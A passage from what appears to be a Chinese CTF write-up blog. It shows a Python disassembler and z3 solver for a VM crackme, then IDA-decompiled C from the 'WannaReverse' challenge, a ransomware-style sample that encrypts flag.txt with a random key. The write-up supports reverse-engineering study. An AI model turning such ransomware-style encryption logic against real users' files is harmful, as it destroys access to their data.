class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf4</span>]</span><br><span class="line">rip = <span class="number">0</span></span><br><span class="line">print(<span class="string">&#x27;reg[1]=18&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> rip&lt;len(opc):</span><br><span class="line">    op = opc[rip]<span class="number">-0x100</span></span><br><span class="line">    print(<span class="string">&#x27;%02x:%02X:&#x27;</span>%(rip,op),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> op==<span class="number">-15</span>:</span><br><span class="line"><span class="comment"># print(&#x27;sub_b5f&#x27;)</span></span><br><span class="line">        cas = opc[rip+<span class="number">1</span>]</span><br><span class="line">        dst = opc[rip+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> cas==<span class="number">0xe1</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[0]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe2</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[1]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe3</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[2]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe4</span>:</span><br><span class="line">            print(<span class="string">&#x27;input[%d]=reg[0]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe5</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[3]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe7</span>:</span><br><span class="line">            print(<span class="string">&#x27;input[%d]=reg[1]&#x27;</span>%dst)</span><br><span class="line"></span><br><span class="line">        rip+=<span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-14</span>:</span><br><span class="line">        print(<span class="string">&#x27;xor reg[0],reg[1]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-11</span>:</span><br><span class="line">        print(<span class="string">&#x27;checkLen&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-12</span>:</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-9</span>:</span><br><span class="line">        print(<span class="string">&#x27;mul reg[0],reg[3]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-8</span>:</span><br><span class="line">        print(<span class="string">&#x27;swap reg[0],reg[1]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-10</span>:</span><br><span class="line">        print(<span class="string">&#x27;reg[0]=reg[2]+2*reg[1]+3*reg[0]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&#x27;</span></span><br><span class="line">a = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> res]</span><br><span class="line">aa = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(aa)):</span><br><span class="line">    a[i]^=<span class="number">18</span></span><br><span class="line">print(bytes(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = [ord(i) for i in res]</span></span><br><span class="line">a = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2a</span>, <span class="number">0x37</span>, <span class="number">0x9</span>, <span class="number">0x17</span>, <span class="number">0xc5</span>, <span class="number">0xb</span>, <span class="number">0x5c</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line">print(len(a))</span><br><span class="line"><span class="comment">#for i in range(len(a)):</span></span><br><span class="line"><span class="comment">#    a[i]=a[i]^18</span></span><br><span class="line"><span class="comment"># print(bytes(aa))</span></span><br><span class="line">v = [BitVec(<span class="string">&#x27;v%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add((v[<span class="number">0</span>]^v[<span class="number">1</span>])==a[<span class="number">0</span>])</span><br><span class="line">s.add((v[<span class="number">1</span>]^v[<span class="number">2</span>])==a[<span class="number">1</span>])</span><br><span class="line">s.add((v[<span class="number">2</span>]^v[<span class="number">3</span>])==a[<span class="number">2</span>])</span><br><span class="line">s.add((v[<span class="number">3</span>]^v[<span class="number">4</span>])==a[<span class="number">3</span>])</span><br><span class="line">s.add((v[<span class="number">4</span>]^v[<span class="number">5</span>])==a[<span class="number">4</span>])</span><br><span class="line">s.add((v[<span class="number">5</span>]^v[<span class="number">6</span>])==a[<span class="number">5</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">8</span>]+<span class="number">2</span>*v[<span class="number">7</span>]+<span class="number">3</span>*v[<span class="number">6</span>])==a[<span class="number">6</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">9</span>]+<span class="number">2</span>*v[<span class="number">8</span>]+<span class="number">3</span>*v[<span class="number">7</span>])==a[<span class="number">7</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">10</span>]+<span class="number">2</span>*v[<span class="number">9</span>]+<span class="number">3</span>*v[<span class="number">8</span>])==a[<span class="number">8</span>])</span><br><span class="line">s.add(v[<span class="number">10</span>]==a[<span class="number">10</span>])</span><br><span class="line">s.add(v[<span class="number">9</span>]==a[<span class="number">9</span>])</span><br><span class="line"><span class="comment"># s.add(v[12]*(v[11]+2*v[10]+3*v[9])==a[9])</span></span><br><span class="line">s.add(v[<span class="number">16</span>]==a[<span class="number">16</span>])</span><br><span class="line">s.add(v[<span class="number">11</span>]==a[<span class="number">11</span>])</span><br><span class="line">s.add(v[<span class="number">13</span>]==a[<span class="number">19</span>])</span><br><span class="line">s.add(v[<span class="number">19</span>]==a[<span class="number">13</span>])</span><br><span class="line">s.add(v[<span class="number">14</span>]==a[<span class="number">18</span>])</span><br><span class="line">s.add(v[<span class="number">18</span>]==a[<span class="number">14</span>])</span><br><span class="line">s.add(v[<span class="number">15</span>]==a[<span class="number">17</span>])</span><br><span class="line">s.add(v[<span class="number">17</span>]==a[<span class="number">15</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]==a[<span class="number">12</span>])</span><br><span class="line"><span class="comment"># s.add(v[20]==a[20])</span></span><br><span class="line">s.add(v[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        flag.append(m[i].as_long())</span><br><span class="line">        print(m[i])</span><br><span class="line">print(bytes(flag))</span><br></pre></td></tr></table></figure>

感觉好坑啊

## [rev][GKCTF2020]WannaReverse

1. 打开任意一个都会换壁纸

2. IDA打开WannaReverse.exe，找到主函数

   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_403220</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">void</span> *v1; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">char</span> v6[<span class="number">32</span>]; <span class="comment">// [esp+8h] [ebp-34h]</span></span><br><span class="line"><span class="keyword">char</span> v7; <span class="comment">// [esp+28h] [ebp-14h]</span></span><br><span class="line"><span class="keyword">char</span> v8[<span class="number">10</span>]; <span class="comment">// [esp+2Ch] [ebp-10h]</span></span><br><span class="line">   </span><br><span class="line">*(_OWORD *)v6 = <span class="number">0</span>i64;</span><br><span class="line">*(_OWORD *)&amp;v6[<span class="number">16</span>] = <span class="number">0</span>i64;</span><br><span class="line">WinExec(<span class="string">&quot;clickme.exe&quot;</span>, <span class="number">1u</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v8, <span class="string">&quot;0123456789&quot;</span>);</span><br><span class="line">v0 = sub_415930(<span class="number">0</span>);</span><br><span class="line">sub_40BAB0(v0);</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    v6[v2++] = v8[sub_40BA70(v1) % <span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span> ( v2 &lt; <span class="number">32</span> );</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v3 = sub_402D00((<span class="keyword">int</span>)v1, (<span class="keyword">int</span>)v6);</span><br><span class="line">v4 = <span class="string">&quot;encrypto success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">    v4 = <span class="string">&quot;encrypto false!&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(v4);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    首先运行clickme.exe，然后生成一个32位的随即密钥，传入sub_402D00，所以sub_402D00应该是加密函数

3. 查看加密函数

   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_402D00</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *FILE_read; <span class="comment">// eax</span></span><br><span class="line">  FILE *FILE_read_1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> len_0; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> keyLen; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read_1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *key; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v17; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v18; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v19; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// edx</span></span><br><span class="line">  BigInteger *v21; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> *v26; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> FILE_write; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> len_1; <span class="comment">// [esp+Ch] [ebp-29Ch]</span></span><br><span class="line">  FILE *FILE_read_2; <span class="comment">// [esp+10h] [ebp-298h]</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read_2; <span class="comment">// [esp+14h] [ebp-294h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [esp+18h] [ebp-290h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *arg2; <span class="comment">// [esp+1Ch] [ebp-28Ch]</span></span><br><span class="line">  <span class="keyword">char</span> key_1[<span class="number">256</span>]; <span class="comment">// [esp+20h] [ebp-288h]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+120h] [ebp-188h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+124h] [ebp-184h]</span></span><br><span class="line">  <span class="keyword">int</span> v42[<span class="number">7</span>]; <span class="comment">// [esp+128h] [ebp-180h]</span></span><br><span class="line">  BigInteger v43; <span class="comment">// [esp+144h] [ebp-164h]</span></span><br><span class="line">  BigInteger v44; <span class="comment">// [esp+160h] [ebp-148h]</span></span><br><span class="line">  BigInteger v45; <span class="comment">// [esp+17Ch] [ebp-12Ch]</span></span><br><span class="line">  <span class="keyword">char</span> toWriteFileName[<span class="number">256</span>]; <span class="comment">// [esp+198h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v47; <span class="comment">// [esp+2A4h] [ebp-4h]</span></span><br><span class="line">   </span><br><span class="line">  arg2 = (<span class="keyword">const</span> <span class="keyword">char</span> *)a2;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  FILE_read = (FILE *)fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  FILE_read_1 = FILE_read;</span><br><span class="line">  FILE_read_2 = FILE_read;</span><br><span class="line">  <span class="keyword">if</span> ( !FILE_read )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flag.txt not exist\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fseek((<span class="keyword">int</span>)FILE_read, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">  len_0 = ftell((<span class="keyword">int</span>)FILE_read_1);</span><br><span class="line">  len_1 = len_0;</span><br><span class="line">  fseek((<span class="keyword">int</span>)FILE_read_1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  len = <span class="number">16</span> * (len_0 / <span class="number">16</span> + <span class="number">1</span>);</span><br><span class="line">  buf_read = (<span class="keyword">char</span> *)malloc_0(len);</span><br><span class="line">  buf_read_2 = buf_read;</span><br><span class="line">  <span class="built_in">memset</span>(buf_read, <span class="number">0</span>, len);</span><br><span class="line">  <span class="keyword">if</span> ( buf_read )</span><br><span class="line">  &#123;</span><br><span class="line">    fread(buf_read, <span class="number">1</span>, len_1, FILE_read_2);</span><br><span class="line">    keyLen = <span class="built_in">strlen</span>(aWannareverse);</span><br><span class="line">    buf_read_1 = buf_read;</span><br><span class="line">    key = aWannareverse;</span><br><span class="line">    v12 = keyLen &lt; <span class="number">4</span>;</span><br><span class="line">    v11 = keyLen - <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">      <span class="keyword">if</span> ( v11 == <span class="number">-4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( *(_DWORD *)buf_read_1 == *(_DWORD *)key )</span><br><span class="line">      &#123;</span><br><span class="line">        buf_read_1 += <span class="number">4</span>;</span><br><span class="line">        key += <span class="number">4</span>;</span><br><span class="line">        v12 = v11 &lt; <span class="number">4</span>;</span><br><span class="line">        v11 -= <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v12 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v12 = (<span class="keyword">unsigned</span> __int8)*buf_read_1 &lt; (<span class="keyword">unsigned</span> __int8)*key;</span><br><span class="line">    <span class="keyword">if</span> ( *buf_read_1 != *key</span><br><span class="line">      || v11 != <span class="number">-3</span></span><br><span class="line">      &amp;&amp; ((v13 = buf_read_1[<span class="number">1</span>], v12 = v13 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">1</span>], v13 != key[<span class="number">1</span>])</span><br><span class="line">       || v11 != <span class="number">-2</span></span><br><span class="line">       &amp;&amp; ((v14 = buf_read_1[<span class="number">2</span>], v12 = v14 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">2</span>], v14 != key[<span class="number">2</span>])</span><br><span class="line">        || v11 != <span class="number">-1</span> &amp;&amp; (v15 = buf_read_1[<span class="number">3</span>], v12 = v15 &lt; (<span class="keyword">unsigned</span> __int8)key[<span class="number">3</span>], v15 != key[<span class="number">3</span>]))) )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = -v12 | <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_16:</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">LABEL_17:</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(key_1, <span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">      v41 = <span class="number">16</span>;</span><br><span class="line">      v40 = <span class="number">0</span>;</span><br><span class="line">      getKey((<span class="keyword">int</span> *)key_1);                     <span class="comment">// initKey</span></span><br><span class="line">      v47 = <span class="number">0</span>;</span><br><span class="line">      v44.next = <span class="number">0</span>;</span><br><span class="line">      v44.len = <span class="number">0</span>;</span><br><span class="line">      v44.maxLen = <span class="number">0</span>;</span><br><span class="line">      v17 = (BigInteger *)<span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">      v44.next = v17;</span><br><span class="line">      v17-&gt;next = <span class="number">0</span>;</span><br><span class="line">      *(_DWORD *)v17-&gt;data = <span class="number">0</span>;</span><br><span class="line">      v44.next-&gt;next = &amp;v44;</span><br><span class="line">      v44.len = <span class="number">0</span>;</span><br><span class="line">      v44.maxLen = <span class="number">15</span>;</span><br><span class="line">      v44.data[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      v47 = <span 